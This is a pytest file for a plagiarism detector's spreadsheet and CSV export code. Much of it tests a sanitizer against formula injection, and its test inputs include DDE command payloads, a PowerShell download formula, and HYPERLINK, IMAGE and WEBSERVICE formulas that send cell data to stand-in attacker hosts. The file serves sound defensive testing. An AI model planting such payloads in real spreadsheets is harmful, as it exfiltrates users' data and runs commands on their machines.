# MIT License
#
# Copyright (c) 2026 Ganesh Kambli
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import inspect
import io
import os
from datetime import datetime, timezone

import openpyxl
import pandas as pd
import pytest

from src.utils.bulk_export import export_incidents_xlsx_stream
from src.utils.excel_export import (
    build_similarity_workbook,
    export_similarity_matrix_to_excel,
    export_similarity_matrix_to_temp_file,
    generate_csv_matrix_stream,
    generate_tsv_matrix_stream,
)
from src.utils.export_sanitizer import sanitize_spreadsheet_value


def test_generate_csv_matrix_stream():
    # Setup test DataFrame
    data = {
        "DocA.txt": [1.0, 0.85, 0.12],
        "DocB.txt": [0.85, 1.0, 0.45],
        "DocC.txt": [0.12, 0.45, 1.0],
    }
    df = pd.DataFrame(data, index=["DocA.txt", "DocB.txt", "DocC.txt"])

    # Test 1: Return type is a Generator
    stream = generate_csv_matrix_stream(df)
    assert inspect.isgenerator(stream)

    # Test 2: Verify chunk output
    chunks = list(stream)
    assert len(chunks) == len(df) + 1  # 1 header row + 3 data rows

    # Verify header line
    assert chunks[0].strip() == "Document,DocA.txt,DocB.txt,DocC.txt"

    # Verify data lines
    assert chunks[1].strip() == "DocA.txt,1.0,0.85,0.12"
    assert chunks[2].strip() == "DocB.txt,0.85,1.0,0.45"
    assert chunks[3].strip() == "DocC.txt,0.12,0.45,1.0"

    # Test 3: Verify complete CSV reconstruction matches Expected CSV output
    full_csv = "".join(chunks)
    reconstructed_df = pd.read_csv(io.StringIO(full_csv), index_col=0)
    pd.testing.assert_frame_equal(df, reconstructed_df, check_names=False)


def test_generate_tsv_matrix_stream():
    # Setup test DataFrame
    data = {
        "DocA.txt": [1.0, 0.85, 0.12],
        "DocB.txt": [0.85, 1.0, 0.45],
        "DocC.txt": [0.12, 0.45, 1.0],
    }
    df = pd.DataFrame(data, index=["DocA.txt", "DocB.txt", "DocC.txt"])

    # Test 1: Return type is a Generator
    stream = generate_tsv_matrix_stream(df)
    assert inspect.isgenerator(stream)

    # Test 2: Verify chunk output
    chunks = list(stream)
    assert len(chunks) == len(df) + 1  # 1 header row + 3 data rows

    # Verify header line with tabs
    assert chunks[0].strip() == "Document\tDocA.txt\tDocB.txt\tDocC.txt"

    # Verify data lines with tabs
    assert chunks[1].strip() == "DocA.txt\t1.0\t0.85\t0.12"
    assert chunks[2].strip() == "DocB.txt\t0.85\t1.0\t0.45"
    assert chunks[3].strip() == "DocC.txt\t0.12\t0.45\t1.0"

    # Test 3: Verify complete TSV reconstruction matches Expected TSV output
    full_tsv = "".join(chunks)
    reconstructed_df = pd.read_csv(io.StringIO(full_tsv), sep="\t", index_col=0)
    pd.testing.assert_frame_equal(df, reconstructed_df, check_names=False)


def test_build_similarity_workbook_metadata_properties():
    """Verify build_similarity_workbook populates document title, creator, and created timestamp (#3438)."""
    df = pd.DataFrame({"Doc1.txt": [1.0]}, index=["Doc1.txt"])
    before = datetime.now(timezone.utc)
    wb = build_similarity_workbook(df)
    after = datetime.now(timezone.utc)

    assert wb.properties.title == "Semantic Plagiarism Similarity Report"
    assert wb.properties.creator == "Semantic Plagiarism Detector"
    assert wb.properties.created is not None
    assert isinstance(wb.properties.created, datetime)
    assert before <= wb.properties.created <= after


def test_build_similarity_workbook_custom_color_thresholds():
    df = pd.DataFrame(
        {"a.txt": [1.0, 0.4], "b.txt": [0.4, 1.0]},
        index=["a.txt", "b.txt"],
    )
    wb = build_similarity_workbook(
        df,
        low_threshold=0.1,
        mid_threshold=0.4,
        high_threshold=0.9,
    )
    rules = list(wb.active.conditional_formatting._cf_rules.values())
    rule = rules[0][0]
    assert float(rule.colorScale.cfvo[0].val) == 0.1
    assert float(rule.colorScale.cfvo[1].val) == 0.4
    assert float(rule.colorScale.cfvo[2].val) == 0.9


def test_export_similarity_matrix_to_excel_persists_metadata():
    """Verify export_similarity_matrix_to_excel persists metadata in the saved XLSX file (#3438)."""
    df = pd.DataFrame(
        {"DocA.txt": [1.0, 0.8], "DocB.txt": [0.8, 1.0]},
        index=["DocA.txt", "DocB.txt"],
    )
    xlsx_bytes = export_similarity_matrix_to_excel(df)
    assert isinstance(xlsx_bytes, bytes)
    assert len(xlsx_bytes) > 0

    # Load back with openpyxl to inspect file properties
    wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
    assert wb.properties.title == "Semantic Plagiarism Similarity Report"
    assert wb.properties.creator == "Semantic Plagiarism Detector"
    assert wb.properties.created is not None


def test_export_incidents_xlsx_stream_persists_metadata():
    """Verify export_incidents_xlsx_stream sets title, creator, and created metadata (#3438)."""
    incidents = [
        {
            "incident_id": "INC-001",
            "document_a": "Essay1.docx",
            "document_b": "Essay2.docx",
            "similarity_score": 0.88,
            "severity_rank": "High",
            "review_status": "Pending",
            "date_flagged": "2026-08-25",
        }
    ]
    xlsx_bytes = export_incidents_xlsx_stream(incidents)
    assert isinstance(xlsx_bytes, bytes)

    wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
    assert wb.properties.title == "Semantic Plagiarism Similarity Report"
    assert wb.properties.creator == "Semantic Plagiarism Detector"
    assert wb.properties.created is not None


def test_build_similarity_workbook_write_only_flag():
    """Verify write_only flag controls openpyxl.Workbook write_only mode (#3435)."""
    df = pd.DataFrame({"DocA.txt": [1.0]}, index=["DocA.txt"])

    wb_standard = build_similarity_workbook(df, write_only=False)
    assert wb_standard.write_only is False

    wb_stream = build_similarity_workbook(df, write_only=True)
    assert wb_stream.write_only is True


def test_write_only_export_similarity_matrix_to_excel_roundtrip():
    """Verify write_only=True produces valid XLSX with identical data and metadata (#3435)."""
    data = {
        "DocA.txt": [1.0, 0.85, 0.12],
        "DocB.txt": [0.85, 1.0, 0.45],
        "DocC.txt": [0.12, 0.45, 1.0],
    }
    df = pd.DataFrame(data, index=["DocA.txt", "DocB.txt", "DocC.txt"])

    xlsx_bytes = export_similarity_matrix_to_excel(df, threshold=0.60, write_only=True)
    assert isinstance(xlsx_bytes, bytes)
    assert len(xlsx_bytes) > 0

    # Load the generated XLSX back with openpyxl
    wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
    assert "Similarity Matrix" in wb.sheetnames
    ws = wb["Similarity Matrix"]

    # Verify header
    headers = [cell.value for cell in ws[1]]
    assert headers == ["Document", "DocA.txt", "DocB.txt", "DocC.txt"]

    # Verify rows
    rows = list(ws.iter_rows(values_only=True))
    assert len(rows) == 4  # Header + 3 data rows
    assert rows[1][0] == "DocA.txt"
    assert rows[1][1] == 1.0
    assert rows[1][2] == 0.85
    assert rows[1][3] == 0.12

    # Verify document properties
    assert wb.properties.title == "Semantic Plagiarism Similarity Report"
    assert wb.properties.creator == "Semantic Plagiarism Detector"
    assert wb.properties.created is not None


def test_write_only_export_similarity_matrix_to_temp_file():
    """Verify export_similarity_matrix_to_temp_file works with write_only=True (#3435)."""
    df = pd.DataFrame(
        {"Doc1.txt": [1.0, 0.5], "Doc2.txt": [0.5, 1.0]},
        index=["Doc1.txt", "Doc2.txt"],
    )
    temp_file = export_similarity_matrix_to_temp_file(df, write_only=True)
    try:
        assert os.path.exists(temp_file)
        assert temp_file.endswith(".xlsx")

        wb = openpyxl.load_workbook(temp_file)
        ws = wb.active
        assert ws.title == "Similarity Matrix"
        assert ws.cell(row=1, column=1).value == "Document"
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)


def test_write_only_large_matrix_export():
    """Verify write_only streams larger matrices without memory or structural errors (#3435)."""
    dim = 25
    doc_names = [f"Student_Document_{i:03d}.docx" for i in range(dim)]
    matrix_data = {doc: [0.75 for _ in range(dim)] for doc in doc_names}
    df = pd.DataFrame(matrix_data, index=doc_names)

    xlsx_bytes = export_similarity_matrix_to_excel(df, threshold=0.70, write_only=True)
    assert len(xlsx_bytes) > 0

    wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
    ws = wb["Similarity Matrix"]
    assert ws.max_row == dim + 1
    assert ws.max_column == dim + 1


# ---------------------------------------------------------------------------
# Unit tests for sanitize_spreadsheet_value control character handling (#3441)
# ---------------------------------------------------------------------------


class TestSanitizeSpreadsheetValueControlCharacters:
    """Comprehensive test suite for spreadsheet formula injection neutralization

    with control character variations and edge cases (#3441).
    """

    def test_sanitize_spreadsheet_value_strips_crlf_before_cmd_formula(self):
        """Verify payloads with CRLF leading characters like \r\n=CMD|' /C calc'!A0

        are stripped of control characters and escaped with a leading single quote.
        """
        payload = "\r\n=CMD|' /C calc'!A0"
        sanitized = sanitize_spreadsheet_value(payload)
        assert sanitized.startswith("'")
        assert sanitized == "'=CMD|' /C calc'!A0"
        assert "\r" not in sanitized
        assert "\n" not in sanitized

    def test_sanitize_spreadsheet_value_strips_null_bytes_and_tabs(self):
        """Verify embedded and leading null bytes and tabs before formula triggers are sanitized."""
        payload = "\x00\t\x01\x0b=SUM(A1:A10)"
        sanitized = sanitize_spreadsheet_value(payload)
        assert sanitized.startswith("'")
        assert sanitized == "'=SUM(A1:A10)"
        assert "\x00" not in sanitized
        assert "\t" not in sanitized
        assert "\x01" not in sanitized
        assert "\x0b" not in sanitized

    def test_sanitize_spreadsheet_value_all_formula_triggers_with_control_chars(self):
        """Verify all formula trigger prefixes (=, +, -, @) prefixed by diverse ASCII control chars (0-31)

        are stripped and prepended with a single quote.
        """
        triggers = ["=", "+", "-", "@"]
        control_chars = [
            "\x00",  # NUL
            "\x01",  # SOH
            "\x02",  # STX
            "\x03",  # ETX
            "\x04",  # EOT
            "\x05",  # ENQ
            "\x06",  # ACK
            "\x07",  # BEL
            "\x08",  # BS
            "\t",  # TAB (0x09)
            "\n",  # LF (0x0A)
            "\x0b",  # VT (0x0B)
            "\x0c",  # FF (0x0C)
            "\r",  # CR (0x0D)
            "\x0e",  # SO
            "\x0f",  # SI
            "\x10",  # DLE
            "\x11",  # DC1
            "\x12",  # DC2
            "\x13",  # DC3
            "\x14",  # DC4
            "\x15",  # NAK
            "\x16",  # SYN
            "\x17",  # ETB
            "\x18",  # CAN
            "\x19",  # EM
            "\x1a",  # SUB
            "\x1b",  # ESC
            "\x1c",  # FS
            "\x1d",  # GS
            "\x1e",  # RS
            "\x1f",  # US
        ]

        for ctrl in control_chars:
            for trigger in triggers:
                raw_val = f"{ctrl}{trigger}1+1"
                sanitized = sanitize_spreadsheet_value(raw_val)
                assert sanitized.startswith(
                    "'"
                ), f"Failed for ctrl {repr(ctrl)} and trigger {trigger}"
                assert sanitized == f"'{trigger}1+1"
                assert ctrl not in sanitized

    def test_sanitize_spreadsheet_value_multiple_consecutive_control_chars(self):
        """Verify multiple consecutive control chars before formula triggers are sanitized."""
        payload = "\r\r\n\n\t\t\x00\x1f-2+3*cmd|' /C calc'!A0"
        sanitized = sanitize_spreadsheet_value(payload)
        assert sanitized.startswith("'")
        assert sanitized == "'-2+3*cmd|' /C calc'!A0"
        for c in range(32):
            assert chr(c) not in sanitized

    def test_sanitize_spreadsheet_value_safe_text_with_control_chars(self):
        """Verify non-formula text containing control chars has control chars removed without leading quote."""
        payload = "Student\r\nAssignment\t1\x00.docx"
        sanitized = sanitize_spreadsheet_value(payload)
        assert sanitized == "StudentAssignment1.docx"
        assert not sanitized.startswith("'")

    def test_sanitize_spreadsheet_value_non_string_types(self):
        """Verify non-string inputs (numbers, None, lists) are returned untouched."""
        assert sanitize_spreadsheet_value(0.95) == 0.95
        assert sanitize_spreadsheet_value(100) == 100
        assert sanitize_spreadsheet_value(None) is None
        assert sanitize_spreadsheet_value(True) is True
        assert sanitize_spreadsheet_value([1, 2, 3]) == [1, 2, 3]

    def test_sanitize_spreadsheet_value_complex_dde_payloads(self):
        """Verify DDE injection payloads disguised with mixed control sequences."""
        dde_payloads = [
            ("\r\n=cmd|'/c calc'!A0", "'=cmd|'/c calc'!A0"),
            ("\t\r@SUM(1+1)*cmd|' /C calc'!A0", "'@SUM(1+1)*cmd|' /C calc'!A0"),
            (
                '\x1b+HYPERLINK("http://malicious.com","Click")',
                '\'+HYPERLINK("http://malicious.com","Click")',
            ),
            ("\x00\x01\x02=2+5+cmd|' /C calc'!A0", "'=2+5+cmd|' /C calc'!A0"),
            ("\r\n-10+20", "'-10+20"),
            ("\n\r+100", "'+100"),
            (
                '\t@IMPORTDATA("http://malicious.com/data.csv")',
                '\'@IMPORTDATA("http://malicious.com/data.csv")',
            ),
        ]
        for raw, expected in dde_payloads:
            sanitized = sanitize_spreadsheet_value(raw)
            assert sanitized == expected
            assert sanitized.startswith("'")

    def test_sanitize_spreadsheet_value_embedded_control_characters_in_formula(self):
        """Verify embedded control characters inside formula body are also stripped."""
        payload = '\r\n=HYPER\x00LINK("https://\r\nattacker.example","Open")'
        sanitized = sanitize_spreadsheet_value(payload)
        assert sanitized.startswith("'")
        assert sanitized == '\'=HYPERLINK("https://attacker.example","Open")'
        assert "\x00" not in sanitized
        assert "\r" not in sanitized
        assert "\n" not in sanitized

    def test_sanitize_spreadsheet_value_in_workbook_builder_headers_and_comments(self):
        """Verify build_similarity_workbook properly sanitizes malicious index and column labels."""
        malicious_label = "\r\n=CMD|' /C calc'!A0"
        df = pd.DataFrame(
            {malicious_label: [1.0]},
            index=[malicious_label],
        )

        wb = build_similarity_workbook(df, write_only=False)
        ws = wb["Similarity Matrix"]

        # Column header cell (row 1, col 2)
        col_header_val = ws.cell(row=1, column=2).value
        assert col_header_val.startswith("'")
        assert col_header_val == "'=CMD|' /C calc'!A0"

        # Row index cell (row 2, col 1)
        row_label_val = ws.cell(row=2, column=1).value
        assert row_label_val.startswith("'")
        assert row_label_val == "'=CMD|' /C calc'!A0"

    def test_sanitize_spreadsheet_value_in_write_only_workbook_builder(self):
        """Verify build_similarity_workbook in write_only mode also neutralizes control character formula triggers."""
        malicious_label = "\r\n=CMD|' /C calc'!A0"
        df = pd.DataFrame(
            {malicious_label: [1.0]},
            index=[malicious_label],
        )

        xlsx_bytes = export_similarity_matrix_to_excel(df, write_only=True)
        wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
        ws = wb["Similarity Matrix"]

        rows = list(ws.iter_rows(values_only=True))
        assert rows[0][1] == "'=CMD|' /C calc'!A0"
        assert rows[1][0] == "'=CMD|' /C calc'!A0"

    def test_sanitize_spreadsheet_value_in_streaming_csv_generator(self):
        """Verify generate_csv_matrix_stream neutralizes control character formula triggers in stream."""
        malicious_label = "\r\n=CMD|' /C calc'!A0"
        df = pd.DataFrame(
            {malicious_label: [1.0]},
            index=[malicious_label],
        )

        chunks = list(generate_csv_matrix_stream(df))
        full_csv = "".join(chunks)

        assert "'=CMD|' /C calc'!A0" in full_csv
        assert "\r\n=CMD" not in full_csv.replace("\r\n", "\n").replace("\n", "")

    def test_sanitize_spreadsheet_value_cve_formula_injection_vectors(self):
        """Verify neutralization of known formula injection and command execution vectors."""
        attack_vectors = [
            "\r\n=1+1",
            "\n+2+5",
            "\r-SUM(1,2)",
            "\t@SUM(1,2)",
            '\x00=HYPERLINK("http://evil.com?leak="&A1,"Click Me")',
            '\x1b=IMAGE("http://evil.com/leak?data="&A1)',
            '\x0b=WEBSERVICE("http://evil.com?"&A1)',
            '\x0c=FILTERXML(WEBSERVICE("http://evil.com"),"//a")',
            '\r\n\t=EXEC("calc.exe")',
            '\x1f+CELL("contents",A1)',
            '\x1e-INFO("directory")',
            "\x1d@MID(A1,1,5)",
            "\x00\r\n=cmd|'/C powershell -c (New-Object Net.WebClient).DownloadFile()'!'A1'",
        ]

        for vec in attack_vectors:
            sanitized = sanitize_spreadsheet_value(vec)
            assert sanitized.startswith(
                "'"
            ), f"Vector was not prepended with quote: {vec}"
            # Ensure no control chars remained in sanitized text
            for c in range(32):
                assert chr(c) not in sanitized, f"Found control char {c} in {sanitized}"

    def test_sanitize_spreadsheet_value_incident_report_stream(self):
        """Verify sanitize_spreadsheet_value neutralizes control character formula triggers across incident record dictionary fields."""
        raw_incident = {
            "incident_id": "\r\n=CMD|' /C calc'!A0",
            "document_a": '\t+HYPERLINK("http://evil.com","DocA")',
            "document_b": "\x00-MALICIOUS_DOC.pdf",
            "similarity_score": 0.99,
            "severity_rank": "\x1b@HIGH",
            "review_status": "Pending",
            "date_flagged": "2026-08-25",
        }

        sanitized_incident = {
            k: sanitize_spreadsheet_value(v) for k, v in raw_incident.items()
        }

        assert sanitized_incident["incident_id"] == "'=CMD|' /C calc'!A0"
        assert (
            sanitized_incident["document_a"] == '\'+HYPERLINK("http://evil.com","DocA")'
        )
        assert sanitized_incident["document_b"] == "'-MALICIOUS_DOC.pdf"
        assert sanitized_incident["severity_rank"] == "'@HIGH"
        assert sanitized_incident["similarity_score"] == 0.99

    def test_sanitize_spreadsheet_value_empty_and_whitespace_only(self):
        """Verify handling of empty strings and strings consisting only of control characters."""
        assert sanitize_spreadsheet_value("") == ""
        assert sanitize_spreadsheet_value("\r\n\t\x00") == ""
        assert sanitize_spreadsheet_value("   ") == "   "
        assert sanitize_spreadsheet_value("\r\n   ") == "   "
        assert (
            sanitize_spreadsheet_value("\r\n =1+1") == " =1+1"
        )  # Starts with space after stripping control chars, so not formula trigger

    def test_sanitize_spreadsheet_value_idempotency(self):
        """Verify idempotency: running sanitization multiple times maintains safety."""
        payload = "\r\n=CMD|' /C calc'!A0"
        first = sanitize_spreadsheet_value(payload)
        second = sanitize_spreadsheet_value(first)
        assert first == "'=CMD|' /C calc'!A0"
        assert second == "'=CMD|' /C calc'!A0"

    def test_sanitize_spreadsheet_value_unicode_and_emojis(self):
        """Verify standard unicode text and emojis pass through intact without unwanted quotes."""
        unicode_payloads = [
            "Research_Paper_日本語.docx",
            "Étude_comparative_littéraire.pdf",
            "Диссертация_Окончательный.docx",
            "Plagiarism_Report_🎯.pdf",
            "Normal text without triggers 123",
        ]
        for text in unicode_payloads:
            sanitized = sanitize_spreadsheet_value(text)
            assert sanitized == text
            assert not sanitized.startswith("'")

    def test_sanitize_spreadsheet_value_long_string_performance_and_safety(self):
        """Verify sanitize_spreadsheet_value handles large strings efficiently without recursion or buffer issues."""
        large_safe_text = "Standard academic essay content " * 1000
        assert sanitize_spreadsheet_value(large_safe_text) == large_safe_text

        large_malicious_text = "\r\n" * 500 + "=SUM(" + "A1," * 500 + "A501)"
        sanitized = sanitize_spreadsheet_value(large_malicious_text)
        assert sanitized.startswith("'=SUM(")
        assert "\r" not in sanitized
        assert "\n" not in sanitized

    def test_sanitize_spreadsheet_value_custom_export_matrix_with_comment_truncation(
        self,
    ):
        """Verify long formula payloads (>60 chars) with control chars get properly sanitized in cell and comment."""
        long_formula = '\r\n=HYPERLINK("https://attacker-domain-long-url-example.com/exploit/leak/session?token=secret1234567890","Click Here")'
        df = pd.DataFrame(
            {long_formula: [0.88]},
            index=[long_formula],
        )

        wb = build_similarity_workbook(df, write_only=False)
        ws = wb["Similarity Matrix"]

        # Check column cell value and comment
        col_cell = ws.cell(row=1, column=2)
        assert col_cell.value.startswith("'")
        assert col_cell.comment is not None
        assert col_cell.comment.text.startswith("'")
        assert "\r" not in col_cell.comment.text
        assert "\n" not in col_cell.comment.text

        # Check row cell value and comment
        row_cell = ws.cell(row=2, column=1)
        assert row_cell.value.startswith("'")
        assert row_cell.comment is not None
        assert row_cell.comment.text.startswith("'")
        assert "\r" not in row_cell.comment.text
        assert "\n" not in row_cell.comment.text

    @pytest.mark.parametrize(
        "payload,expected",
        [
            ("\x00=1+1", "'=1+1"),
            ("\x01+2+2", "'+2+2"),
            ("\x02-3-3", "'-3-3"),
            ("\x03@SUM(A1:A5)", "'@SUM(A1:A5)"),
            ("\x04\t=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"),
            ('\x05\r=HYPERLINK("http://test.com")', '\'=HYPERLINK("http://test.com")'),
            ("\x06\n+AVERAGE(B1:B10)", "'+AVERAGE(B1:B10)"),
            ("\x07-MIN(C1:C10)", "'-MIN(C1:C10)"),
            ("\x08@MAX(D1:D10)", "'@MAX(D1:D10)"),
            ("\x0e=POWER(2,8)", "'=POWER(2,8)"),
            ("\x0f+CONCATENATE(A1,B1)", "'+CONCATENATE(A1,B1)"),
            ("\x10-STDEV(E1:E20)", "'-STDEV(E1:E20)"),
            ('\x11@COUNTIF(F1:F10,">0")', '\'@COUNTIF(F1:F10,">0")'),
            ("\x12=VLOOKUP(1,A:B,2,FALSE)", "'=VLOOKUP(1,A:B,2,FALSE)"),
            ("\x13+INDEX(A:A,1)", "'+INDEX(A:A,1)"),
            ('\x14-MATCH("target",A:A,0)', '\'-MATCH("target",A:A,0)'),
            ("\x15@OFFSET(A1,1,1)", "'@OFFSET(A1,1,1)"),
            ('\x16=INDIRECT("A1")', '\'=INDIRECT("A1")'),
            ('\x17+CELL("type",A1)', '\'+CELL("type",A1)'),
            ('\x18-INFO("release")', '\'-INFO("release")'),
            ("\x19@ISBLANK(A1)", "'@ISBLANK(A1)"),
            ("\x1a=ISERROR(A1)", "'=ISERROR(A1)"),
            ("\x1b+ISNUMBER(A1)", "'+ISNUMBER(A1)"),
            ("\x1c-ISTEXT(A1)", "'-ISTEXT(A1)"),
            ("\x1d@TRIM(A1)", "'@TRIM(A1)"),
            ("\x1e=CLEAN(A1)", "'=CLEAN(A1)"),
            ("\x1f+UPPER(A1)", "'+UPPER(A1)"),
        ],
    )
    def test_sanitize_spreadsheet_value_control_char_parametrized(
        self, payload, expected
    ):
        """Verify individual control character variants (0x00 - 0x1F) are stripped and escaped."""
        sanitized = sanitize_spreadsheet_value(payload)
        assert sanitized == expected
        assert sanitized.startswith("'")

    @pytest.mark.parametrize(
        "safe_input",
        [
            "Standard Document Title.docx",
            "Research_Project_Final_2026.pdf",
            "1234567890",
            "Doc-with-hyphens-and_underscores.txt",
            "Document with spaces (v1.2).docx",
            "Comparative Analysis of Algorithms",
            "Chapter 1: Introduction and Literature Review",
            "Appendix A - Raw Benchmark Results",
        ],
    )
    def test_sanitize_spreadsheet_value_safe_strings_unmodified(self, safe_input):
        """Verify that standard safe strings without formula triggers remain untouched without apostrophe prefix."""
        assert sanitize_spreadsheet_value(safe_input) == safe_input
        assert not sanitize_spreadsheet_value(safe_input).startswith("'")
